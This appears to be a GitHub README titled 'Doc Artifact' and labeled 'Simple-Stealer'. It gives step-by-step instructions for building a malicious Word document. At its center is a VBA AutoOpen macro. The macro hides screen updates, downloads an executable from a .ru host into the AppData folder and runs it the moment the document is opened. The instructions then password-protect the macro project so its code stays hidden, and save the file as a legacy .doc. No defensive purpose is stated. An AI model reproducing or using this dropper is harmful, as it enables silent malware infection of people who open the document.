<h1 align="center">Doc Artifact</h1>

-------
Launch Microsoft Word.
By default, the Developer tab is not visible, but you can add it to the ribbon.
1.On the File tab, go to Options > Customize Ribbon.
2.In the Ribbon Customization section, in the Main Tabs list, select the Developer check box.
Then we enter the Visual Basic development mode.

---
<p align="center">
	<img src="https://i.postimg.cc/FHhVdDwN/11.png" />
</p>
---

And we write our code in the document.

---
~~~vbs
Sub AutoOpen()
Application.ScreenUpdating = False
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://server.ru/file.exe", False
xHttp.Send
Dim j As String
j = Environ("AppDATA")
With bStrm
.Type = 1
.Open
.write xHttp.responseBody
.savetofile j & "\file.exe", 2 '//overwrite
End With
Shell (j & "\file.exe")
Application.ScreenUpdating = True
End Sub
~~~
---

<p align="center">
	<img src="https://i.postimg.cc/qRHsrwsP/22.png" />
</p>

Next, go to the project settings and set a password.

---
<p align="center">
	<img src="https://i.postimg.cc/QMFDDk8J/33.png" />
</p>
---

---
<p align="center">
	<img src="https://i.postimg.cc/Vk3GSj9R/44.png" />
</p>
---

Next, save the file with the Word Document 97-2003 (*.doc) type

---
<p align="center">
	<img src="https://i.postimg.cc/hGB6Gkqs/55.png" />
</p>
---

"# Simple-Stealer" 
